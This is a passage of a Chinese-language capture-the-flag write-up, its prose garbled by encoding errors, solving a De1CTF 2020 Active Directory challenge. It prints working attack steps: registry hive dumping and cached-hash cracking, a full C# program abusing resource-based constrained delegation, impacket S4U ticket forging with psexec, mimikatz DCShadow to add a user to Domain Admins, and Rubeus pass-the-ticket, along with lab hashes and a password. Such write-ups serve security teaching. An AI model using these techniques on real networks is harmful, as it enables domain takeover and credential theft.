class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&#39;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure><p>ä»æç¤ºå¯ä»¥çœ‹å‡ºæ¥ï¼Œå‡ºé¢˜çš„æ€è·¯æ˜¯ï¼Œé€šè¿‡æŸç§ç¦»çº¿çˆ†ç ´çš„æ–¹æ³•æ‹¿åˆ°De1taå¯†ç ï¼ŒDe1taç”¨æˆ·å­˜åœ¨aclæ»¥ç”¨é—®é¢˜ä»¥è‡³äºå¯ä»¥æåˆ°åŸŸæ§æ‹¿ä¸‹è¯»åˆ°C:\Users\Administrator\Desktop\flag.txtã€‚</p><p>å…³äºå¦‚ä½•ç¦»çº¿çˆ†ç ´æˆ‘è¿™é‡Œæ˜¯éé¢„æœŸï¼Œä¹‹å‰æœåŠ¡å™¨webè´¦å·æœ‰ç‰¹æƒå¯ä»¥juicypotatoææƒã€‚<br><img src="1588573565560-9d6716f9-d32b-4eb5-9a9c-91711b04a197.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&name=image.png&originHeight=340&originWidth=1518&size=164466&status=done&style=none&width=759" alt="image.png"><br>æˆ‘ä¸€ç›´æ²¡æˆåŠŸã€‚<br><img src="1588573783800-0db2592f-a2cd-4c5f-9cdd-4ca11d0cf248.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=286&originWidth=2938&size=333395&status=done&style=none&width=1469" alt="image.png"><br>å½“æ—¶æœ‰å…¶ä»–å¸ˆå‚…æˆåŠŸï¼Œç»™æˆ‘å¼¹äº†ä¸ªsystem shellã€‚<br><img src="1588573859200-550561f7-5f5a-4a84-a1fa-e13ccac3ada6.png#align=left&display=inline&height=850&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1700&originWidth=2336&size=1034458&status=done&style=none&width=1168" alt="image.png"><br>å¯¼å‡ºDe1taè´¦æˆ·çš„mscach</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">python secretsdump.py -security &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;hash&#x2F;security.hive -system &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;hash&#x2F;SYSTEM.hive LOCAL</span><br></pre></td></tr></table></figure><p><img src="1588574718180-d11b9ed0-667b-4ae6-99e4-e01193c87746.png#align=left&display=inline&height=475&margin=%5Bobject%20Object%5D&name=image.png&originHeight=950&originWidth=1648&size=236880&status=done&style=none&width=824" alt="image.png"><br>å¯ä»¥æ‹¿åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DE1CTF2020.LAB&#x2F;De1ta:$DCC2$10240#De1ta#52c2cfff23d879a2ba830cf184c10b46</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºçš„å¯†ç å¤æ‚åº¦ï¼Œç”¨hascatè·‘å‡ºæ¥ç»“æœæ˜¯3f23ea12ã€‚</p><p>å¯†ç æœ‰äº†ä¸‹ä¸€æ­¥æ ¹æ®æç¤ºæ¥Delta aclæ»¥ç”¨é—®é¢˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;wintool&#x2F;PowerView-master.ps1</span><br><span class="line">powershell Get-ObjectAcl -Domain De1CTF2020.lab -ResolveGUIDs|?&#123;$_.IdentityReference -eq &quot;DE1CTF2020\De1ta&quot;&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå‡ºæ¥äº†å¾ˆå¤šä¸œè¥¿é‡ç‚¹å…³æ³¨ä¸¤ä¸ªåœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªåœ°æ–¹æ˜¯De1taçš„ExtendedRightè®©ä»–å…·å¤‡Dcshadowçš„æ”»å‡»çš„èƒ½åŠ›ã€‚<br><img src="1588575673500-53352e9a-aeb4-4e14-9ad0-b26a863c9020.png#align=left&display=inline&height=677&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1354&originWidth=1986&size=264009&status=done&style=none&width=993" alt="image.png"></p><p><img src="1588575717063-9f145c16-c35c-42f5-a0e6-e5324a265a61.png#align=left&display=inline&height=780&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=2814&size=306391&status=done&style=none&width=1407" alt="image.png"></p><p>é€šè¿‡æŸ¥é˜…èµ„æ–™å¯ä»¥çŸ¥é“Dcshadowæ”»å‡»æ—¶éœ€è¦De1taè¿™ç§ç‰¹æƒè´¦å·å’Œä¸€ä¸ªSYSTEMè´¦å·ã€‚åšåˆ°è¿™é‡Œçš„æ—¶å€™juciypotatoå·²ç»ä¿®äº†ï¼Œä¹‹å‰æŠ“çš„administrator hashä¹Ÿæ”¹äº†ã€‚ï¼ˆ<strong>ç»éªŒä¸ä¸°å¯Œï¼Œå¦‚æœä¹‹å‰æŠ“äº†æœºå™¨hashä¹Ÿèƒ½ææƒäº†</strong>ï¼‰ã€‚</p><p>æ¥ä¸‹æ¥å°±éœ€è¦å…³æ³¨ç¬¬äºŒä¸ªåœ°æ–¹äº†ã€‚De1taç”¨æˆ·å¯¹DMæœºå™¨å…·æœ‰WritePropertyï¼Œç¯å¢ƒåˆæ˜¯12ï¼Œæ‰€ä»¥å¯ä»¥ç”¨çƒ‚ç•ªèŒ„ææƒã€‚<br><img src="1588581133347-61181c79-d803-4958-8961-9ffbcfcbd06d.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=1468&size=81567&status=done&style=none&width=734" alt="image.png"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Security.AccessControl;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Addnew_MachineAccount</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            String DomainController = <span class="string">"192.168.0.12"</span>;</span><br><span class="line">            String Domain = <span class="string">"De1CTF2020.lab"</span>;</span><br><span class="line">            String new_MachineAccount = <span class="string">"lisan4"</span>; <span class="comment">//æ·»åŠ çš„æœºå™¨è´¦æˆ·</span></span><br><span class="line">            String new_MachineAccount_password = <span class="string">"sycl0ver"</span>; <span class="comment">//æœºå™¨è´¦æˆ·å¯†ç </span></span><br><span class="line">            String victimcomputer = <span class="string">"DM"</span>; <span class="comment">//éœ€è¦è¿›è¡Œææƒçš„æœºå™¨</span></span><br><span class="line">            String victimcomputer_ldap_path = <span class="string">"LDAP://CN=DM,CN=Computers,DC=De1CTF2020,DC=lab"</span>;</span><br><span class="line">            String machine_account = new_MachineAccount;</span><br><span class="line">            String sam_account = machine_account + <span class="string">"$"</span>;</span><br><span class="line"></span><br><span class="line">            String distinguished_name = <span class="string">""</span>;</span><br><span class="line">            String[] DC_array = <span class="literal">null</span>;</span><br><span class="line">            distinguished_name = <span class="string">"CN="</span> + machine_account + <span class="string">",CN=Computers"</span>;</span><br><span class="line">            DC_array = Domain.Split(<span class="string">'.'</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (String DC <span class="keyword">in</span> DC_array)</span><br><span class="line">            &#123;</span><br><span class="line">                distinguished_name += <span class="string">",DC="</span> + DC;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Elevate permissions on "</span> + victimcomputer);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain = "</span> + Domain);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain Controller = "</span> + DomainController);</span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] New SAMAccountName = " + sam_account);</span></span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] Distinguished Name = " + distinguished_name);</span></span><br><span class="line">            <span class="comment">//è¿æ¥ldap</span></span><br><span class="line">            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, <span class="number">389</span>);</span><br><span class="line">            <span class="comment">//NetworkCredential nc = new NetworkCredential(username, password); //ä½¿ç”¨å‡­æ®ç™»å½•            </span></span><br><span class="line"></span><br><span class="line">            System.DirectoryServices.Protocols.LdapConnection connection = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);</span></span><br><span class="line">            connection = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapConnection(identifier);</span><br><span class="line">            connection.SessionOptions.Sealing = <span class="literal">true</span>;</span><br><span class="line">            connection.SessionOptions.Signing = <span class="literal">true</span>;</span><br><span class="line">            connection.Bind();</span><br><span class="line">            <span class="keyword">var</span> request = <span class="keyword">new</span> System.DirectoryServices.Protocols.AddRequest(distinguished_name, <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute[] &#123;</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"DnsHostName"</span>, machine_account +<span class="string">"."</span>+ Domain),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"SamAccountName"</span>, sam_account),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"userAccountControl"</span>, <span class="string">"4096"</span>),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"unicodePwd"</span>, Encoding.Unicode.GetBytes(<span class="string">"\""</span> + new_MachineAccount_password + <span class="string">"\""</span>)),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"objectClass"</span>, <span class="string">"Computer"</span>),</span><br><span class="line">               <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"ServicePrincipalName"</span>, <span class="string">"HOST/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"RestrictedKrbHost/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"HOST/"</span>+machine_account,<span class="string">"RestrictedKrbHost/"</span>+machine_account)</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//æ·»åŠ æœºå™¨è´¦æˆ·</span></span><br><span class="line">                connection.SendRequest(request);</span><br><span class="line">                Console.WriteLine(<span class="string">"[+] Machine account: "</span> + machine_account + <span class="string">" Password: "</span> + new_MachineAccount_password + <span class="string">" added"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)"</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] Exception: "</span> + ex.Message);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è·å–æ–°è®¡ç®—æœºå¯¹è±¡çš„SID</span></span><br><span class="line">            <span class="keyword">var</span> new_request = <span class="keyword">new</span> System.DirectoryServices.Protocols.SearchRequest(distinguished_name, <span class="string">"(&amp;(samAccountType=805306369)(|(name="</span> + machine_account + <span class="string">")))"</span>, System.DirectoryServices.Protocols.SearchScope.Subtree, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">var</span> new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);</span><br><span class="line">            SecurityIdentifier sid = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (System.DirectoryServices.Protocols.SearchResultEntry entry <span class="keyword">in</span> new_response.Entries)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    sid = <span class="keyword">new</span> SecurityIdentifier(entry.Attributes[<span class="string">"objectsid"</span>][<span class="number">0</span>] <span class="keyword">as</span> <span class="keyword">byte</span>[], <span class="number">0</span>);</span><br><span class="line">                    Console.Out.WriteLine(<span class="string">"[+] "</span> + new_MachineAccount + <span class="string">" SID : "</span> + sid.Value);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] It was not possible to retrieve the SID.\nExiting..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//è®¾ç½®èµ„æºçº¦æŸå§”æ´¾</span></span><br><span class="line">            System.DirectoryServices.DirectoryEntry myldapConnection = <span class="keyword">new</span> System.DirectoryServices.DirectoryEntry(<span class="string">"De1CTF2020.lab"</span>,<span class="string">"De1ta"</span>, <span class="string">"3f23ea12"</span>);</span><br><span class="line"></span><br><span class="line">            myldapConnection.Path = victimcomputer_ldap_path;</span><br><span class="line"></span><br><span class="line">            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;</span><br><span class="line">            System.DirectoryServices.DirectorySearcher search = <span class="keyword">new</span> System.DirectoryServices.DirectorySearcher(myldapConnection);</span><br><span class="line">            <span class="comment">//é€šè¿‡ldapæ‰¾è®¡ç®—æœº</span></span><br><span class="line">            search.Filter = <span class="string">"(CN="</span> + victimcomputer + <span class="string">")"</span>;</span><br><span class="line">            <span class="keyword">string</span>[] requiredProperties = <span class="keyword">new</span> <span class="keyword">string</span>[] &#123; <span class="string">"samaccountname"</span> &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (String property <span class="keyword">in</span> requiredProperties)</span><br><span class="line">                search.PropertiesToLoad.Add(property);</span><br><span class="line">            System.DirectoryServices.SearchResult result = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                result = search.FindOne();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message + <span class="string">"Exiting..."</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();</span><br><span class="line">                String sec_desc = <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;"</span> + sid.Value + <span class="string">")"</span>;</span><br><span class="line">                System.Security.AccessControl.RawSecurityDescriptor sd = <span class="keyword">new</span> RawSecurityDescriptor(sec_desc);</span><br><span class="line">                <span class="keyword">byte</span>[] riptor_buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[sd.BinaryLength];</span><br><span class="line">                sd.GetBinaryForm(riptor_buffer, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// æ·»åŠ evilpcçš„sidåˆ°msds-allowedtoactonbehalfofotheridentityä¸­</span></span><br><span class="line">                entryToUpdate.Properties[<span class="string">"msds-allowedtoactonbehalfofotheridentity"</span>].Value = riptor_buffer;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    entryToUpdate.CommitChanges();<span class="comment">//æäº¤æ›´æ”¹</span></span><br><span class="line">                    Console.WriteLine(<span class="string">"[+] Exploit successfully!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(ex.Message);</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] \nFailed..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºç¯å¢ƒå¾ˆæ··ä¹±å‡ ä¸ªé˜Ÿä¼éƒ½åœ¨ç›¸äº’è¦†ç›–msds-allowedtoactonbehalfofotheridentityï¼Œæ‰€ä»¥å…ˆåæ·»åŠ äº†å¤šä¸ªspnã€‚ã€‚lisan3$ lisan4$<br><img src="1588576411595-d794a138-0eb8-4738-b4c5-ea04f61683b3.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=1112&size=65288&status=done&style=none&width=746" alt="image.png"><br>åŠ ä¸Šå§”æ´¾ä¹‹åç„¶åå°±æ˜¯s4uææƒäº†ã€‚è¿™é‡Œè¸©äº†å¤§å‘ï¼Œä¸‹é¢æ¥è¯´ä¸€ä¸‹ã€‚æˆ‘å…ˆç”¨çš„kekeoã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:lisan3$ &#x2F;domain:De1CTF2020.lab &#x2F;ntlm:30a7b270355d67451970d37ff1c9b666</span><br><span class="line">tgs::s4u &#x2F;tgt:TGT_lisan3$@DE1CTF2020.LAB_krbtgt~De1CTF2020.lab@DE1CTF2020.LAB.kirbi &#x2F;user:Administrator@De1CTF2020.lab &#x2F;service:cifs&#x2F;DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure><p>S4U2selfæˆåŠŸS4U2Proxyå¤±è´¥ï¼ˆ<strong>å½“æ—¶åå¤ç¡®è®¤è¿‡å§”æ´¾åŠ ä¸Šäº†çš„</strong>ï¼‰<br><img src="1588578737623-9634b019-dbd5-4878-b9b2-c970e69673fb.png#align=left&display=inline&height=285&margin=%5Bobject%20Object%5D&name=image.png&originHeight=776&originWidth=2032&size=191776&status=done&style=none&width=746" alt="image.png"><br><img src="1588578449118-60bc0cf5-845d-4a75-9838-3537490e2e89.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=978&originWidth=3130&size=307346&status=done&style=none&width=746" alt="image.png"></p><p>æ¢ä¸ªå·¥å…·rubues<br><img src="1588578877865-fa62ab88-598a-448a-9f29-a5e09ad0154b.png#align=left&display=inline&height=657&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1314&originWidth=1520&size=477950&status=done&style=none&width=760" alt="image.png"><br>ä½†æ˜¯dirå§‹ç»ˆä¸æˆåŠŸï¼ˆåæ¥é—®äº†ä¸€ä¸ªå¸ˆå‚…ç­”å¤æ˜¯ï¼šè®¿é—®è‡ªå·±æœ¬èº«é»˜è®¤éƒ½æ˜¯ç”¨å½“å‰ç”¨æˆ·èº«ä»½å»è®¤è¯ï¼Œä¸èµ°ç½‘ç»œè®¤è¯ï¼Œå¿…é¡»å¾—ä¸»åŠ¨è°ƒç”¨ç½‘ç»œè®¤è¯æ‰è¡Œï¼‰ã€‚<br><img src="1588578947263-dd9595db-1ef7-4933-956f-802b8d5973f2.png#align=left&display=inline&height=447&margin=%5Bobject%20Object%5D&name=image.png&originHeight=894&originWidth=2030&size=165161&status=done&style=none&width=1015" alt="image.png"><br>èµ°åˆ°è¿™é‡Œå¤©è‰²å·²æ™šæœ‰ç‚¹è‚ä¸åŠ¨äº†ï¼Œå°±æ²¡ç»§ç»­äº†ã€‚ç¬¬äºŒå¤©æ¯”èµ›ç»“æŸå‡ºé¢˜å¸ˆå‚…ç»™æˆ‘è¯´ç”¨impakectå°±å¯ä»¥s4uè€Œä¸”èƒ½æˆã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -spn cifs&#x2F;dm.De1CTF2020.lab De1CTF2020&#x2F;lisan4$</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-master&#x2F;examples&#x2F;lisan4$.ccache</span><br><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -k -impersonate Administrator -spn cifs&#x2F;dm.De1CTF2020.lab De1CTF2020&#x2F;lisan4$</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-master&#x2F;examples&#x2F;Administrator.ccache</span><br><span class="line">proxychains psexec.py -k -no-pass dm.De1CTF2020.lab</span><br></pre></td></tr></table></figure><p><strong>è¿™é‡Œä¸€å®šæ³¨æ„è¦ç”¨fqdnï¼ˆdm.De1CTF2020.labï¼‰æ¥è¯·æ±‚ï¼Œä¸è¦ç”¨ipã€‚</strong><br><strong>è¿™é‡Œä¸€å®šæ³¨æ„è¦ç”¨fqdnï¼ˆdm.De1CTF2020.labï¼‰æ¥è¯·æ±‚ï¼Œä¸è¦ç”¨ipã€‚</strong><br><strong>è¿™é‡Œä¸€å®šæ³¨æ„è¦ç”¨fqdnï¼ˆdm.De1CTF2020.labï¼‰æ¥è¯·æ±‚ï¼Œä¸è¦ç”¨ipã€‚</strong><br><strong><img src="1588579527302-5542f401-8459-4357-9d30-f4d0bbb75834.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=2110&size=852755&status=done&style=none&width=1055" alt="image.png"></strong><br>æœ‰systemæƒé™åå°±æ˜¯Dcshadowçš„æ“ä½œäº†</p><p>systemæƒé™ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mimikatz.exe &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow &#x2F;object:de1ta &#x2F;attribute:primaryGroupID &#x2F;value:512&quot;</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸€ç›´ä»¥ä¸ºè¿™ç§éäº¤äº’å¼çš„mimkatzè¿è¡Œå®Œä¼šè¢«beaconè‡ªåŠ¨å…³é—­æ‰ï¼Œå®é™…æµ‹ä¸‹æ¥å¹¶ä¸ä¼šã€‚<br><img src="1588580027676-64acd1f2-4138-4a48-8328-e8c898022ff7.png#align=left&display=inline&height=721&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1442&originWidth=2398&size=323731&status=done&style=none&width=1199" alt="image.png"><br>De1taæƒé™ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mimikatz.exe &quot;lsadump::dcshadow &#x2F;push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="1588580226016-f9634854-eaa3-4542-b4aa-5b6a59536ee9.png#align=left&display=inline&height=702&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1404&originWidth=2018&size=262325&status=done&style=none&width=1009" alt="image.png"><br>æ‰§è¡Œå®Œåsystemé‚£è¾¹ä¼šæœ‰ååº”<br><img src="1588580304255-65913d34-697b-402d-ac44-1a37b924c90c.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=774&originWidth=1562&size=123041&status=done&style=none&width=781" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°åŠ ä¸Šäº†<br><img src="1588580360804-da863178-d3eb-4ec1-aeb2-cc6c9c9042b9.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1432&size=73835&status=done&style=none&width=746" alt="image.png"><br>ç…§ç†å¯ä»¥ç›´æ¥diräº†ä½†æ˜¯æœ€åè¿˜æ˜¯æœ‰ä¸€ä¸ªè«åå…¶å¦™çš„å‘ï¼ˆå¿½è§†å›¾ä¸­æŠŠè·¯å¾„å†™é”™äº†ï¼Œä¸è¿‡ä¸å½±å“è¿™é‡Œçš„æ„æ€å°±æ˜¯æ²¡æƒé™ï¼Œè·¯å¾„ä¸å­˜åœ¨æ˜¯å¦å¤–ä¸€ä¸ªæŠ¥é”™ï¼‰<br><img src="1588580430211-30595b4a-cadb-4f8e-87b1-2a0d2913d5a9.png#align=left&display=inline&height=297&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=1720&size=125984&status=done&style=none&width=860" alt="image.png"><br>ç”¨rubuesé‡æ–°æ¥ä¸€æ¬¡tgtå°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell Rubeus.exe asktgt &#x2F;user:de1ta &#x2F;rc4:B03094996601324646AC223BF30D0D07 &#x2F;domain:de1ctf2020.lab &#x2F;ptt</span><br><span class="line">shell type \\dc\c$\users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure><p><img src="1588580555529-42793246-2e0e-45ea-a113-9cebe5dc9d0f.png#align=left&display=inline&height=117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=214&originWidth=1364&size=44777&status=done&style=none&width=746" alt="image.png"></p><h2 id="æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç "><a href="#æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç " class="headerlink" title="æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç "></a>æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç </h2><p><img src="1588585694577-60526aee-a9a7-4263-ba3d-8085030371f6.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=1810&size=134342&status=done&style=none&width=905" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 